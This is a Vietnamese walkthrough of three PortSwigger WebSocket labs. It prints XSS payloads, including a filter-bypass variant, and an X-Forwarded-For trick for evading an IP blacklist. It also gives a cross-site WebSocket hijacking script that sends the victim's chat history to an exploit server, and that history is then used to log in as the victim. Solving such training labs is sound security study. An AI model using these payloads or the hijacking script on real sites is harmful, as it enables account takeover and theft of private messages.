# Web socket

# **Lab: Manipulating WebSocket messages to exploit vulnerabilities**

[Lab: Manipulating WebSocket messages to exploit vulnerabilities | Web Security Academy](https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities)

- Thực hiện điều hướng vào chức năng `Live chat > Send`
    
    ![image.png](Web%20socket/image.png)
    
- Trong phần mềm Burpsuite, thực hiện bắt và chỉnh sửa requestdùng web socket có nội dung là tin nhắn vừa chat. Chỉnh sửa nội dung thành payload sau:
    - Payload
        
        ```jsx
        <img src=x onerror=alert(1)>
        ```
        
    - Request
        
        ```jsx
        {"message":"<img src=x onerror=alert(1)>"}
        ```
        
        ![image.png](Web%20socket/image%201.png)
        
- Thực hiện chuyển tiếp request. Quay lại browser quan sát thấy alert thành công, tức là bên phía bot chat cũng có alert
    - POC
        
        ![image.png](Web%20socket/image%202.png)
        
- Hoàn thành giải lab
    - POC
        
        ![image.png](Web%20socket/image%203.png)
        

# **Lab: Cross-site WebSocket hijacking**

[Lab: Cross-site WebSocket hijacking | Web Security Academy](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking/lab)

- Trước hết quan sát thấy khi truy cập web có lỗ hổng thì response trả về samesite là none ⇒ cookie từ trang này không được bảo vệ an toàn khi bị gọi từ trang khác
    - POC
        
        ![image.png](Web%20socket/image%204.png)
        
- Tiếp theo điều hướng đến chức năng `Live chat > Send` . Quan sát thấy chức năng này sử dụng web socket.
    - POC
        
        ![image.png](Web%20socket/image%205.png)
        
- Thực hiện tạo một trang gọi đến web socket trên bằng exploit server như sau:
    - Exploit server
        - Head
            
            ```jsx
            HTTP/1.1 200 OK
            Content-Type: text/html; charset=utf-8
            ```
            
        - Body
            
            ```jsx
            <script>      var ws = new WebSocket('wss://<url-lab>/chat');          ws.onopen = function() {         ws.send("READY");     };          ws.onmessage = function(event) {              fetch('https://<url-exploit-server>/log?res='+btoa(event.data));     }; </script>
            ```
            
- Thực hiện deliver to victim.
    
    ![image.png](Web%20socket/image%206.png)
    
- Sau đó, khi truy cập log quan sát thấy đoạn chat của victim xuất hiện trong log dưới dạng base64 encode
    - POC
        
        ![image.png](Web%20socket/image%207.png)
        
        ![image.png](Web%20socket/image%208.png)
        
- Thực hiện login bằng credential lấy được. Thành công lấy được account và hoàn thành giải lab
    - POC
        
        ![image.png](Web%20socket/image%209.png)
        

# **Lab: Manipulating the WebSocket handshake to exploit vulnerabilities**

[Lab: Manipulating the WebSocket handshake to exploit vulnerabilities | Web Security Academy](https://portswigger.net/web-security/websockets/lab-manipulating-handshake-to-exploit-vulnerabilities)

- Thực hiện điều hướng đến chức năng `Live chat`
    
    ![image.png](Web%20socket/image%2010.png)
    
- Thực hiện chat với nội dung là `<img src=x onerror=alert(1)>` nhận thấy phía be chặn handler event cũng như là `aler`t khi đi cùng với`()`
    - POC
        - Chặn event handler
            
            ![image.png](Web%20socket/image%2011.png)
            
        - Chặn `alert` khi đi cùng dấu `()`
            
            ![image.png](Web%20socket/image%2012.png)
            
            ![image.png](Web%20socket/image%2013.png)
            
- Ở đây, có thể vượt qua IP blacklist bằng cách dùng `X-Forwarded-For`
    - POC
        
        ![image.png](Web%20socket/image%2014.png)
        
- Trước hết, chúng ta có thể bypass chặn event handler bằng cách trộn lẫn ký tự hoa thường. Tiếp theo, chúng ta có thể dùng HTML encode để encode 2 dấu `()` . Nhờ vậy, chúng ta có được payload sau:
    - Payload
        
        ```html
        <img src=x onEror=alert&#x28;1&#x29;>
        ```
        
- Thực hiện gửi message này cho victim, quan sát thấy ở web chat chúng ta bị alert ⇒ victim cũng bị alert ⇒ hoàn thành giải lab
    - POC
        
        ![image.png](Web%20socket/image%2015.png)